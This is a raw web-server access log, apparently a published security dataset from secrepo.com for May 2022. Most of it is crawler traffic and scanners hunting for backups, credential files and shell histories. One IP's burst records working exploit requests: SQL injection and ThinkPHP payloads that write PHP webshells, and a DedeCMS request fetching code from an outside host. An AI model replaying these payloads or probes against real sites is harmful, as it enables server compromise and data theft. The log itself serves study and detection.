45.91.20.168 - - [15/May/2022:01:59:30 -0700] "HEAD /old/bak.zip HTTP/1.1" 301 178 "-" "-" 
45.91.20.168 - - [15/May/2022:01:59:30 -0700] "HEAD /old/bak.zip HTTP/1.1" 404 265 "-" "-" 
45.86.200.210 - - [15/May/2022:01:59:31 -0700] "HEAD /backup.sql.gz HTTP/1.1" 301 180 "-" "-" 
45.86.200.210 - - [15/May/2022:01:59:32 -0700] "HEAD /backup.sql.gz HTTP/1.1" 404 265 "-" "-" 
45.89.175.86 - - [15/May/2022:01:59:41 -0700] "HEAD /old/directory.rar HTTP/1.1" 301 184 "-" "-" 
45.89.175.86 - - [15/May/2022:01:59:41 -0700] "HEAD /old/directory.rar HTTP/1.1" 404 265 "-" "-" 
49.7.21.88 - - [15/May/2022:02:01:07 -0700] "GET / HTTP/1.1" 200 13145 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
98.159.226.30 - - [15/May/2022:02:01:21 -0700] "HEAD /restore/wallet.dat HTTP/1.1" 301 185 "-" "-" 
98.159.226.30 - - [15/May/2022:02:01:22 -0700] "HEAD /restore/wallet.dat HTTP/1.1" 404 265 "-" "-" 
45.86.200.177 - - [15/May/2022:02:01:55 -0700] "HEAD /restore/directory.zip HTTP/1.1" 301 188 "-" "-" 
45.86.200.177 - - [15/May/2022:02:01:55 -0700] "HEAD /restore/directory.zip HTTP/1.1" 404 265 "-" "-" 
78.162.219.139 - - [15/May/2022:02:02:28 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36" 
85.203.45.188 - - [15/May/2022:02:03:52 -0700] "HEAD /back/public_html.zip HTTP/1.1" 301 187 "-" "-" 
85.203.45.188 - - [15/May/2022:02:03:52 -0700] "HEAD /back/public_html.zip HTTP/1.1" 404 265 "-" "-" 
157.55.39.153 - - [15/May/2022:02:05:19 -0700] "GET /self.logs/ HTTP/1.1" 200 36121 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
212.30.37.17 - - [15/May/2022:02:08:38 -0700] "HEAD /backups/directory.gz HTTP/1.1" 301 187 "-" "-" 
212.30.37.17 - - [15/May/2022:02:08:39 -0700] "HEAD /backups/directory.gz HTTP/1.1" 404 265 "-" "-" 
212.30.33.12 - - [15/May/2022:02:08:48 -0700] "HEAD /bak/website.tar HTTP/1.1" 301 182 "-" "-" 
212.30.33.12 - - [15/May/2022:02:08:48 -0700] "HEAD /bak/website.tar HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:09:53 -0700] "HEAD /secrepo.com.zip HTTP/1.1" 301 182 "-" "-" 
98.159.226.30 - - [15/May/2022:02:09:53 -0700] "HEAD /secrepo.com.zip HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:10:15 -0700] "HEAD /__MACOSX.zip HTTP/1.1" 301 179 "-" "-" 
98.159.226.30 - - [15/May/2022:02:10:15 -0700] "HEAD /__MACOSX.zip HTTP/1.1" 404 265 "-" "-" 
212.30.37.17 - - [15/May/2022:02:13:08 -0700] "HEAD /restore/archive.zip HTTP/1.1" 301 186 "-" "-" 
212.30.37.17 - - [15/May/2022:02:13:08 -0700] "HEAD /restore/archive.zip HTTP/1.1" 404 265 "-" "-" 
45.86.200.177 - - [15/May/2022:02:13:27 -0700] "HEAD /old/backup.sql HTTP/1.1" 301 181 "-" "-" 
45.86.200.177 - - [15/May/2022:02:13:27 -0700] "HEAD /old/backup.sql HTTP/1.1" 404 265 "-" "-" 
212.30.33.12 - - [15/May/2022:02:13:29 -0700] "HEAD /bak/bak.tar HTTP/1.1" 301 178 "-" "-" 
212.30.33.12 - - [15/May/2022:02:13:29 -0700] "HEAD /bak/bak.tar HTTP/1.1" 404 265 "-" "-" 
212.30.37.17 - - [15/May/2022:02:14:18 -0700] "HEAD /backup/backup.sql.tar HTTP/1.1" 301 188 "-" "-" 
212.30.37.17 - - [15/May/2022:02:14:19 -0700] "HEAD /backup/backup.sql.tar HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:14:34 -0700] "HEAD /backups/bak.rar HTTP/1.1" 301 182 "-" "-" 
98.159.226.30 - - [15/May/2022:02:14:34 -0700] "HEAD /backups/bak.rar HTTP/1.1" 404 265 "-" "-" 
114.119.140.174 - - [15/May/2022:02:14:58 -0700] "GET /self.logs/error.log.2017-04-19.gz HTTP/1.1" 200 1022 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
45.130.81.87 - - [15/May/2022:02:15:07 -0700] "HEAD /backup/www.tar.gz HTTP/1.1" 301 184 "-" "-" 
45.130.81.87 - - [15/May/2022:02:15:08 -0700] "HEAD /backup/www.tar.gz HTTP/1.1" 404 265 "-" "-" 
183.80.18.34 - - [15/May/2022:02:15:15 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279529 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3415.0 Safari/537.36" 
141.239.126.157 - - [15/May/2022:02:16:45 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39" 
141.239.126.157 - - [15/May/2022:02:16:45 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39" 
141.239.126.157 - - [15/May/2022:02:16:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39" 
141.239.126.157 - - [15/May/2022:02:16:45 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39" 
141.239.126.157 - - [15/May/2022:02:16:49 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39" 
45.89.175.86 - - [15/May/2022:02:17:55 -0700] "HEAD /restore/website.tar HTTP/1.1" 301 186 "-" "-" 
45.89.175.86 - - [15/May/2022:02:17:55 -0700] "HEAD /restore/website.tar HTTP/1.1" 404 265 "-" "-" 
45.89.175.86 - - [15/May/2022:02:18:03 -0700] "HEAD /backups/www.gz HTTP/1.1" 301 181 "-" "-" 
45.89.175.86 - - [15/May/2022:02:18:03 -0700] "HEAD /backups/www.gz HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:19:34 -0700] "HEAD /backups/wallet.zip HTTP/1.1" 301 185 "-" "-" 
98.159.226.30 - - [15/May/2022:02:19:34 -0700] "HEAD /backups/wallet.zip HTTP/1.1" 404 265 "-" "-" 
212.30.37.50 - - [15/May/2022:02:19:42 -0700] "HEAD /restore/www.tar HTTP/1.1" 301 182 "-" "-" 
212.30.37.50 - - [15/May/2022:02:19:42 -0700] "HEAD /restore/www.tar HTTP/1.1" 404 265 "-" "-" 
183.80.18.34 - - [15/May/2022:02:19:43 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279529 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15" 
45.130.81.87 - - [15/May/2022:02:19:53 -0700] "HEAD /restore/bak.tar.gz HTTP/1.1" 301 185 "-" "-" 
45.130.81.87 - - [15/May/2022:02:19:54 -0700] "HEAD /restore/bak.tar.gz HTTP/1.1" 404 265 "-" "-" 
49.7.20.111 - - [15/May/2022:02:20:55 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
98.159.226.30 - - [15/May/2022:02:21:05 -0700] "HEAD /bak/directory.zip HTTP/1.1" 301 184 "-" "-" 
98.159.226.30 - - [15/May/2022:02:21:05 -0700] "HEAD /bak/directory.zip HTTP/1.1" 404 265 "-" "-" 
212.30.33.44 - - [15/May/2022:02:22:17 -0700] "HEAD /back/mysql.sql HTTP/1.1" 301 181 "-" "-" 
212.30.33.44 - - [15/May/2022:02:22:17 -0700] "HEAD /back/mysql.sql HTTP/1.1" 404 265 "-" "-" 
45.86.200.194 - - [15/May/2022:02:22:56 -0700] "HEAD /back/bak.zip HTTP/1.1" 301 179 "-" "-" 
45.86.200.194 - - [15/May/2022:02:22:56 -0700] "HEAD /back/bak.zip HTTP/1.1" 404 265 "-" "-" 
85.203.45.188 - - [15/May/2022:02:23:18 -0700] "HEAD /bak/bak.gz HTTP/1.1" 301 177 "-" "-" 
85.203.45.188 - - [15/May/2022:02:23:18 -0700] "HEAD /bak/bak.gz HTTP/1.1" 404 265 "-" "-" 
45.91.20.168 - - [15/May/2022:02:24:42 -0700] "HEAD /backups/secrepo.com.sql HTTP/1.1" 301 190 "-" "-" 
45.91.20.168 - - [15/May/2022:02:24:42 -0700] "HEAD /backups/secrepo.com.sql HTTP/1.1" 404 265 "-" "-" 
114.119.145.137 - - [15/May/2022:02:25:05 -0700] "GET /self.logs/error.log.2018-04-19.gz HTTP/1.1" 200 4769 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
85.203.45.188 - - [15/May/2022:02:25:12 -0700] "HEAD /restore/public_html.gz HTTP/1.1" 301 189 "-" "-" 
85.203.45.188 - - [15/May/2022:02:25:13 -0700] "HEAD /restore/public_html.gz HTTP/1.1" 404 265 "-" "-" 
45.86.200.194 - - [15/May/2022:02:26:22 -0700] "HEAD /backup/.well-known.zip HTTP/1.1" 301 189 "-" "-" 
45.86.200.194 - - [15/May/2022:02:26:22 -0700] "HEAD /backup/.well-known.zip HTTP/1.1" 404 265 "-" "-" 
45.91.20.168 - - [15/May/2022:02:26:47 -0700] "HEAD /backups/www.zip HTTP/1.1" 301 182 "-" "-" 
45.91.20.168 - - [15/May/2022:02:26:47 -0700] "HEAD /backups/www.zip HTTP/1.1" 404 265 "-" "-" 
45.89.175.86 - - [15/May/2022:02:27:07 -0700] "HEAD /bak/www.rar HTTP/1.1" 301 178 "-" "-" 
45.89.175.86 - - [15/May/2022:02:27:07 -0700] "HEAD /bak/www.rar HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:27:09 -0700] "HEAD /backup.tar HTTP/1.1" 301 177 "-" "-" 
98.159.226.30 - - [15/May/2022:02:27:09 -0700] "HEAD /backup.tar HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:27:52 -0700] "HEAD /restore/.bash_history HTTP/1.1" 301 188 "-" "-" 
98.159.226.30 - - [15/May/2022:02:27:53 -0700] "HEAD /restore/.bash_history HTTP/1.1" 404 265 "-" "-" 
98.159.226.30 - - [15/May/2022:02:28:00 -0700] "HEAD /backups/www.rar HTTP/1.1" 301 182 "-" "-" 
98.159.226.30 - - [15/May/2022:02:28:00 -0700] "HEAD /backups/www.rar HTTP/1.1" 404 265 "-" "-" 
212.30.33.44 - - [15/May/2022:02:29:29 -0700] "HEAD /old/mysql.sql HTTP/1.1" 301 180 "-" "-" 
212.30.33.44 - - [15/May/2022:02:29:29 -0700] "HEAD /old/mysql.sql HTTP/1.1" 404 265 "-" "-" 
49.7.21.88 - - [15/May/2022:02:30:11 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
45.89.175.86 - - [15/May/2022:02:30:27 -0700] "HEAD /restore/backup.tar HTTP/1.1" 301 185 "-" "-" 
45.89.175.86 - - [15/May/2022:02:30:27 -0700] "HEAD /restore/backup.tar HTTP/1.1" 404 265 "-" "-" 
85.203.45.188 - - [15/May/2022:02:31:10 -0700] "HEAD /backups/sftp-config.json HTTP/1.1" 301 191 "-" "-" 
85.203.45.188 - - [15/May/2022:02:31:10 -0700] "HEAD /backups/sftp-config.json HTTP/1.1" 404 265 "-" "-" 
207.46.13.196 - - [15/May/2022:02:34:19 -0700] "GET /self.logs/error.log.2022-04-13.gz HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
183.80.18.34 - - [15/May/2022:02:36:51 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279529 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
45.128.199.33 - - [15/May/2022:02:37:40 -0700] "HEAD /restore/directory.tar HTTP/1.1" 301 188 "-" "-" 
45.128.199.33 - - [15/May/2022:02:37:41 -0700] "HEAD /restore/directory.tar HTTP/1.1" 404 265 "-" "-" 
85.203.45.135 - - [15/May/2022:02:38:07 -0700] "HEAD /backup/.bash_history HTTP/1.1" 301 187 "-" "-" 
85.203.45.135 - - [15/May/2022:02:38:08 -0700] "HEAD /backup/.bash_history HTTP/1.1" 404 265 "-" "-" 
82.118.30.72 - - [15/May/2022:02:38:49 -0700] "HEAD /backups/.bash_history HTTP/1.1" 301 188 "-" "-" 
82.118.30.72 - - [15/May/2022:02:38:50 -0700] "HEAD /backups/.bash_history HTTP/1.1" 404 265 "-" "-" 
157.97.122.57 - - [15/May/2022:02:39:17 -0700] "HEAD /restore/secrepo.com.gz HTTP/1.1" 301 189 "-" "-" 
157.97.122.57 - - [15/May/2022:02:39:17 -0700] "HEAD /restore/secrepo.com.gz HTTP/1.1" 404 265 "-" "-" 
103.205.211.115 - - [15/May/2022:02:40:31 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 284 "www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:02:40:33 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=ywogd.php&updateHost=http://2.bj33.cc/ HTTP/1.1" 404 328 "http://www.secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=ywogd.php&updateHost=http://2.bj33.cc/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:34 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 284 "www.secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" 
103.205.211.115 - - [15/May/2022:02:40:35 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 250 "www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.205.211.115 - - [15/May/2022:02:40:36 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 328 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:36 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:36 -0700] "POST /fdgq.php HTTP/1.1" 418 746 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:36 -0700] "GET /index.php HTTP/1.1" 404 305 "http://www.secrepo.com/index.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:37 -0700] "GET /index.php/user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:37 -0700] "POST /index.php/ysyqq.php HTTP/1.1" 418 746 "http://www.secrepo.com/index.php/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:37 -0700] "GET /index.php/e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:37 -0700] "GET /index.php/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:38 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=msvar.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=msvar.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:38 -0700] "GET /msvar.php HTTP/1.1" 404 305 "http://www.secrepo.com/msvar.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.205.211.115 - - [15/May/2022:02:40:38 -0700] "GET /index.php/seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
82.118.30.72 - - [15/May/2022:02:41:08 -0700] "HEAD /sftp-config.json HTTP/1.1" 301 183 "-" "-" 
82.118.30.72 - - [15/May/2022:02:41:09 -0700] "HEAD /sftp-config.json HTTP/1.1" 404 265 "-" "-" 
45.128.199.33 - - [15/May/2022:02:41:20 -0700] "HEAD /credentials.txt HTTP/1.1" 301 182 "-" "-" 
45.128.199.33 - - [15/May/2022:02:41:20 -0700] "HEAD /credentials.txt HTTP/1.1" 404 265 "-" "-" 
51.222.253.7 - - [15/May/2022:02:42:04 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 779 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
45.95.243.18 - - [15/May/2022:02:43:10 -0700] "HEAD /back/website.tar.gz HTTP/1.1" 301 186 "-" "-" 
45.95.243.18 - - [15/May/2022:02:43:10 -0700] "HEAD /back/website.tar.gz HTTP/1.1" 404 265 "-" "-" 
82.118.30.57 - - [15/May/2022:02:46:15 -0700] "HEAD /backup/public_html.zip HTTP/1.1" 301 189 "-" "-" 
82.118.30.57 - - [15/May/2022:02:46:16 -0700] "HEAD /backup/public_html.zip HTTP/1.1" 404 265 "-" "-" 
45.91.20.158 - - [15/May/2022:02:46:19 -0700] "HEAD /backup.gz HTTP/1.1" 301 176 "-" "-" 
45.91.20.158 - - [15/May/2022:02:46:19 -0700] "HEAD /backup.gz HTTP/1.1" 404 265 "-" "-" 
45.91.20.158 - - [15/May/2022:02:46:22 -0700] "HEAD /bak/dump.sql HTTP/1.1" 301 179 "-" "-" 
45.91.20.158 - - [15/May/2022:02:46:22 -0700] "HEAD /bak/dump.sql HTTP/1.1" 404 265 "-" "-" 
45.8.17.5 - - [15/May/2022:02:46:50 -0700] "HEAD /backups/bak.tar HTTP/1.1" 301 182 "-" "-" 
45.8.17.5 - - [15/May/2022:02:46:51 -0700] "HEAD /backups/bak.tar HTTP/1.1" 404 265 "-" "-" 
49.7.20.111 - - [15/May/2022:02:47:36 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
185.191.171.19 - - [15/May/2022:02:49:53 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.36 - - [15/May/2022:02:49:53 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/files.html HTTP/1.1" 200 1881 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
114.119.149.218 - - [15/May/2022:02:55:35 -0700] "GET /self.logs/error.log.2017-09-23.gz HTTP/1.1" 200 2207 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.88 - - [15/May/2022:02:59:03 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.140.174 - - [15/May/2022:03:05:55 -0700] "GET /self.logs/access.log.2020-12-30.gz HTTP/1.1" 200 36698 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.20 - - [15/May/2022:03:08:54 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=A HTTP/1.1" 200 788 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
198.23.242.155 - - [15/May/2022:03:11:48 -0700] "GET / HTTP/1.1" 200 13183 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" 
49.7.20.111 - - [15/May/2022:03:14:34 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.237 - - [15/May/2022:03:15:56 -0700] "GET /self.logs/error.log.2019-12-14.gz HTTP/1.1" 200 1362 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
34.200.141.47 - - [15/May/2022:03:22:30 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420944 "-" "curl/7.79.1" 
114.119.149.218 - - [15/May/2022:03:26:28 -0700] "GET /self.logs/access.log.2018-08-21.gz HTTP/1.1" 200 20037 "http://www.secrepo.com/self.logs/?C=M%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.88 - - [15/May/2022:03:30:21 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.111 - - [15/May/2022:03:39:06 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.145.137 - - [15/May/2022:03:46:40 -0700] "GET /self.logs/access.log.2020-10-19.gz HTTP/1.1" 200 16191 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.82 - - [15/May/2022:03:49:14 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.115 - - [15/May/2022:03:49:15 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.113 - - [15/May/2022:03:49:20 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
51.222.253.19 - - [15/May/2022:03:50:04 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1" 200 783 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
115.135.141.247 - - [15/May/2022:03:52:12 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
115.135.141.247 - - [15/May/2022:03:52:13 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:52:13 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:52:13 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:52:14 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" 
115.135.141.247 - - [15/May/2022:03:52:14 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
115.135.141.247 - - [15/May/2022:03:52:14 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/15610.3.7.1.10 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)" 
185.191.171.42 - - [15/May/2022:03:52:36 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.33 - - [15/May/2022:03:52:36 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ftp.html HTTP/1.1" 200 1728 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
218.93.208.94 - - [15/May/2022:03:57:07 -0700] "GET / HTTP/1.1" 200 13183 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52" 
